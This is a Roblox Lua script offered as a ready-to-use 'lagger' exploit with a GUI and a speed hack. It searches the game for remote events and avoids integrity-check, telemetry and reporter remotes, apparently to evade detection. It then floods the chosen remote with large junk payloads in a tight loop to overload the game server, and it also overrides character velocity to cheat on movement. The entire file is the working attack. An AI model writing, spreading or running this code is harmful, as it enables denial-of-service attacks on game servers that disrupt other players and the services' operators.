local Players = game:GetService("Players")
local player = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local playerGui = player:WaitForChild("PlayerGui")
local isLagging = false
local speedEnabled = false
local speedConn = nil
local uuid = "d80e2217-36b8-4bdc-9a46-2281c6f70b28"
local power = 47
local speed = 50
local target = nil
local fireLoop = nil
local function findTarget()
    local foundRemotes = {}
    local priorityTargets = {
        "WhyAreTheyTargetingMe!!",
        "FisherMan",
        "Chat",
        "AFK",
        "CookiesService"
    }
    local blacklistedNames = {
        "PlaceCooldownFromChat",
        "AdminPanelService",
        "AdminPanel",
        "IntegrityCheckProcessor",
        "LocalizationTableAnalyticsSender",
        "LocalizationService",
        "Analytics",
        "Telemetry",
        "Logger",
        "Reporter",
        "CanChatWith",
        "SetPlayerBlockList",
        "UpdatePlayerBlockList",
        "NewPlayerGroupDetails",
        "NewPlayerCanManageDetails",
        "SendPlayerBlockList",
        "UpdateLocalPlayerBlockList",
        "SendPlayerProfileSettings",
        "RequestPlayerProfileSettings",
        "UpdatePlayerProfileSettings",
        "ShowFriendJoinedPlayerToast",
        "ShowPlayerJoinedFriendsToast",
        "CreateOrJoinParty",
        "ServerSideBulkPurchaseEvent",
        "SetDialogInUse",
        "ContactListInvokeIrisInvite",
        "ContactListIrisInviteTeleport",
        "UpdateCurrentCall",
        "RequestDeviceCameraOrientationCapability",
        "ReceiveLikelySpeakingUsers",
        "ReferredPlayerJoin",
        "Update",
        "RE/Tools/Cooldown",
        "RE/FuseMachine/RevealNow",
        "RE/FuseMachine/FuseAnimation",
        "RE/NotificationService/Notify",
        "RE/PlotService/ClaimCoins",
        "RE/PlotService/Sell",
        "RE/PlotService/Open",
        "RE/PlotService/ToggleFriends",
        "RE/PlotService/CashCollected",
        "RE/ChatService/ChatMessage",
        "RE/SoundService/PlayClientSound",
        "RE/Snapshot/RealiableChannel",
        "RE/CommandsService/OpenCommandBar",
        "RE/92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "92e5a494-0ab4-4c4e-ae6b-96e5f4a2a698",
        "6411a778-07a5-4513-b1c7-60b65ae05ac8",
        "RE/GameService/SpawnEffect",
        "RE/Leaderboard/ReplicateDisplayNames",
        "eb9dee81-7718-4020-b6b2-219888488d13",
        "fce51e06-a587-4ff0-9e19-869eb1859a01",
        "680db8c7-c46a-492c-b451-6e980910902c",
        "RE/StealService/Grab",
        "RE/PlotService/Place",
        "RE/StealService/StealingSuccess",
        "RE/StealService/StealingFailure",
        "RE/CombatService/ApplyImpulse",
        "RE/InventoryService/Sort",
        "RE/StockEventService/SetFocused",
        "RE/StockEventService/Return",
        "RE/StockEventService/Redeem",
        "RE/MerchantService/SetFocused",
        "RE/MerchantService/Animation",
        "RE/SantaMerchantService/SetFocused",
        "RE/SantaMerchantService/Animation",
        "RE/SantaMerchantService/CollectGoldElf",
        "RE/ShopService/Purchase",
        "RE/TutorialService/StartTutorial",
        "RE/TutorialService/FinishTutorial",
        "RE/TeleportService/Reconnect"
    }
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
            local fullName = v:GetFullName()
            local remoteName = v.Name
            local isBlacklisted = false
            for _, blacklisted in ipairs(blacklistedNames) do
                if string.find(fullName, blacklisted, 1, true) or string.find(remoteName, blacklisted, 1, true) then
                    isBlacklisted = true
                    break
                end
            end
            if not isBlacklisted then
                local isPriority = false
                for _, priority in ipairs(priorityTargets) do
                    if string.find(remoteName, priority, 1, true) then
                        isPriority = true
                        table.insert(foundRemotes, 1, v)
                        break
                    end
                end
                if not isPriority then
                    table.insert(foundRemotes, v)
                end
            end
        end
    end
    if #foundRemotes > 0 then
        return foundRemotes[1]
    end
    return nil
end
local function setSpeed(enable)
    if speedEnabled == enable then return end
    speedEnabled = enable
    if speedConn then
        speedConn:Disconnect()
        speedConn = nil
    end
    if speedEnabled then
        speedConn = RunService.Heartbeat:Connect(function()
            local char = player.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hum or not hrp then return end
            local moveDir = hum.MoveDirection
            if moveDir.Magnitude > 0 then
                hrp.AssemblyLinearVelocity = Vector3.new(
                    moveDir.X * speed,
                    hrp.AssemblyLinearVelocity.Y,
                    moveDir.Z * speed
                )
            end
        end)
    end
    updateUI()
end
local function tweenProperty(object, property, endValue, duration)
    local tween = TweenService:Create(
        object,
        TweenInfo.new(duration or 0.2, Enum.EasingStyle.Quad),
        {[property] = endValue}
    )
    tween:Play()
    return tween
end
local powerLabel
local sliderFill
local function safeUpdateUI(callback)
    pcall(callback)
end
local lagButton
local speedButton
local function updateUI()
    safeUpdateUI(function()
        if isLagging then
            lagButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            lagButton.Text = "Lagging"
        else
            lagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            lagButton.Text = "Lagger"
        end
        if speedEnabled then
            speedButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            speedButton.Text = "Speed: ON"
        else
            speedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
            speedButton.Text = "Speed: OFF"
        end
    end)
end
local function updatePower(newPower)
    power = math.clamp(newPower, 1, 200)
    local percentage = math.floor((power / 200) * 100)
    local pkts = power * 1800
    powerLabel.Text = string.format("Power: %d%% (%d pkts)", percentage, pkts)
    sliderFill.Size = UDim2.new((power - 1) / 199, 0, 1, 0)
end
local function toggleLag()
    isLagging = not isLagging
    if isLagging then
        if not target or not target.Parent then
            target = findTarget()
        end
        if not target then
            isLagging = false
            updateUI()
            return
        end
        fireLoop = task.spawn(function()
            while isLagging do
                if not target or not target.Parent then
                    target = findTarget()
                    if not target then
                        isLagging = false
                        break
                    end
                end
                local payloadSize = power * 150
                local payload = string.rep("X", payloadSize)
                local fireCount = math.max(1, math.floor(power / 50))
                for i = 1, fireCount do
                    pcall(function()
                        target:FireServer(uuid, payload)
                    end)
                end
                task.wait(0.035)
            end
        end)
    else
        if fireLoop then
            task.cancel(fireLoop)
            fireLoop = nil
        end
    end
    updateUI()
end
local gui = Instance.new("ScreenGui")
gui.Name = "SpeedLaggerGUI_" .. tick()
gui.Parent = playerGui
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 200, 0, 200)
mainFrame.Position = UDim2.new(0.5, -100, 0.5, -100)
mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = gui
local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = mainFrame
local uiStroke = Instance.new("UIStroke", mainFrame)
uiStroke.Thickness = 2.5
uiStroke.Color = Color3.fromRGB(255, 255, 255)
uiStroke.Transparency = 0
local uiGradient = Instance.new("UIGradient")
uiGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.15, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(0.30, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.45, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(0.60, Color3.fromRGB(255, 255, 255)),
    ColorSequenceKeypoint.new(0.75, Color3.fromRGB(0, 0, 0)),
    ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))
})
uiGradient.Rotation = 0
uiGradient.Parent = uiStroke
task.spawn(function()
    while task.wait() do
        for i = 0, 360, 2 do
            uiGradient.Rotation = i
            task.wait(0.01)
        end
    end
end)
local header = Instance.new("Frame")
header.Size = UDim2.new(1, 0, 0, 45)
header.BackgroundTransparency = 1
header.Parent = mainFrame
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -10, 0, 18)
title.Position = UDim2.new(0, 10, 0, 8)
title.BackgroundTransparency = 1
title.Text = "Ar1es Lagger"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = header
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, -10, 0, 12)
subtitle.Position = UDim2.new(0, 10, 0, 28)
subtitle.BackgroundTransparency = 1
subtitle.Text = "Made by Onyx"
subtitle.TextColor3 = Color3.fromRGB(255, 255, 255)
subtitle.TextSize = 9
subtitle.Font = Enum.Font.Gotham
subtitle.TextXAlignment = Enum.TextXAlignment.Left
subtitle.Parent = header
local contentFrame = Instance.new("Frame")
contentFrame.Size = UDim2.new(1, -16, 1, -55)
contentFrame.Position = UDim2.new(0, 8, 0, 50)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = mainFrame
local powerSection = Instance.new("Frame")
powerSection.Size = UDim2.new(1, 0, 0, 65)
powerSection.Position = UDim2.new(0, 0, 0, 0)
powerSection.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
powerSection.BorderSizePixel = 0
powerSection.Parent = contentFrame
local powerSectionCorner = Instance.new("UICorner")
powerSectionCorner.CornerRadius = UDim.new(0, 8)
powerSectionCorner.Parent = powerSection
local powerSectionBorder = Instance.new("UIStroke")
powerSectionBorder.Color = Color3.fromRGB(255, 255, 255)
powerSectionBorder.Thickness = 2
powerSectionBorder.Parent = powerSection
powerLabel = Instance.new("TextLabel")
powerLabel.Size = UDim2.new(1, -20, 0, 16)
powerLabel.Position = UDim2.new(0, 10, 0, 6)
powerLabel.BackgroundTransparency = 1
powerLabel.Text = "Power: 23% (84600 pkts)"
powerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
powerLabel.TextSize = 10
powerLabel.Font = Enum.Font.GothamBold
powerLabel.TextXAlignment = Enum.TextXAlignment.Left
powerLabel.Parent = powerSection
local sliderBg = Instance.new("Frame")
sliderBg.Size = UDim2.new(1, -20, 0, 8)
sliderBg.Position = UDim2.new(0, 10, 0, 32)
sliderBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
sliderBg.BorderSizePixel = 0
sliderBg.Parent = powerSection
local sliderBgCorner = Instance.new("UICorner")
sliderBgCorner.CornerRadius = UDim.new(0, 4)
sliderBgCorner.Parent = sliderBg
sliderFill = Instance.new("Frame")
sliderFill.Size = UDim2.new(0.23, 0, 1, 0)
sliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sliderFill.BorderSizePixel = 0
sliderFill.Parent = sliderBg
local sliderFillCorner = Instance.new("UICorner")
sliderFillCorner.CornerRadius = UDim.new(0, 4)
sliderFillCorner.Parent = sliderFill
local sliderKnob = Instance.new("Frame")
sliderKnob.Size = UDim2.new(0, 16, 0, 16)
sliderKnob.Position = UDim2.new(1, -8, 0.5, -8)
sliderKnob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
sliderKnob.BorderSizePixel = 0
sliderKnob.Parent = sliderFill
local sliderKnobCorner = Instance.new("UICorner")
sliderKnobCorner.CornerRadius = UDim.new(1, 0)
sliderKnobCorner.Parent = sliderKnob
local sliderButton = Instance.new("TextButton")
sliderButton.Size = UDim2.new(1, 0, 1, 8)
sliderButton.Position = UDim2.new(0, 0, 0, -4)
sliderButton.BackgroundTransparency = 1
sliderButton.Text = ""
sliderButton.Parent = sliderBg
local minLabel = Instance.new("TextLabel")
minLabel.Size = UDim2.new(0, 15, 0, 12)
minLabel.Position = UDim2.new(0, 10, 0, 45)
minLabel.BackgroundTransparency = 1
minLabel.Text = "1"
minLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
minLabel.TextSize = 8
minLabel.Font = Enum.Font.Gotham
minLabel.TextXAlignment = Enum.TextXAlignment.Left
minLabel.Parent = powerSection
local maxLabel = Instance.new("TextLabel")
maxLabel.Size = UDim2.new(0, 25, 0, 12)
maxLabel.Position = UDim2.new(1, -35, 0, 45)
maxLabel.BackgroundTransparency = 1
maxLabel.Text = "200"
maxLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
maxLabel.TextSize = 8
maxLabel.Font = Enum.Font.Gotham
maxLabel.TextXAlignment = Enum.TextXAlignment.Right
maxLabel.Parent = powerSection
lagButton = Instance.new("TextButton")
lagButton.Size = UDim2.new(1, 0, 0, 32)
lagButton.Position = UDim2.new(0, 0, 0, 73)
lagButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
lagButton.Text = "Lagger"
lagButton.TextColor3 = Color3.fromRGB(255, 255, 255)
lagButton.TextSize = 12
lagButton.Font = Enum.Font.GothamBold
lagButton.BorderSizePixel = 0
lagButton.Parent = contentFrame
local lagBtnCorner = Instance.new("UICorner")
lagBtnCorner.CornerRadius = UDim.new(0, 8)
lagBtnCorner.Parent = lagButton
local lagBtnBorder = Instance.new("UIStroke")
lagBtnBorder.Color = Color3.fromRGB(255, 255, 255)
lagBtnBorder.Thickness = 2
lagBtnBorder.Parent = lagButton
lagButton.MouseButton1Click:Connect(function()
    toggleLag()
end)
speedButton = Instance.new("TextButton")
speedButton.Size = UDim2.new(1, 0, 0, 32)
speedButton.Position = UDim2.new(0, 0, 0, 110)
speedButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
speedButton.Text = "Speed: OFF"
speedButton.TextColor3 = Color3.fromRGB(255, 255, 255)
speedButton.TextSize = 12
speedButton.Font = Enum.Font.GothamBold
speedButton.BorderSizePixel = 0
speedButton.Parent = contentFrame
local speedBtnCorner = Instance.new("UICorner")
speedBtnCorner.CornerRadius = UDim.new(0, 8)
speedBtnCorner.Parent = speedButton
local speedBtnBorder = Instance.new("UIStroke")
speedBtnBorder.Color = Color3.fromRGB(255, 255, 255)
speedBtnBorder.Thickness = 2
speedBtnBorder.Parent = speedButton
speedButton.MouseButton1Click:Connect(function()
    setSpeed(not speedEnabled)
end)
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 14)
footer.Position = UDim2.new(0, 0, 1, -18)
footer.BackgroundTransparency = 1
footer.Text = "discord.gg/Fk6e7fE7CF"
footer.TextColor3 = Color3.fromRGB(255, 255, 255)
footer.TextSize = 10
footer.Font = Enum.Font.Gotham
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.Parent = mainFrame
local draggingSlider = false
local function updateSliderPosition(inputPosition)
    local relativeX = math.clamp((inputPosition.X - sliderBg.AbsolutePosition.X) / sliderBg.AbsoluteSize.X, 0, 1)
    local newPower = math.floor(1 + relativeX * 199)
    updatePower(newPower)
end
sliderButton.MouseButton1Down:Connect(function()
    draggingSlider = true
end)
sliderButton.TouchTap:Connect(function(inputPositions)
    local pos = inputPositions[1]
    updateSliderPosition(Vector2.new(pos.x, pos.y))
end)
UserInputService.InputChanged:Connect(function(input)
    if draggingSlider and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateSliderPosition(input.Position)
    end
end)
UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingSlider = false
    end
end)
local draggingFrame = false
local dragInput, dragStart, startPos
local function updateDrag(input)
    local delta = input.Position - dragStart
    mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
end
header.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        draggingFrame = true
        dragStart = input.Position
        startPos = mainFrame.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                draggingFrame = false
            end
        end)
    end
end)
header.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)
UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and draggingFrame then
        updateDrag(input)
    end
end)
updatePower(47)
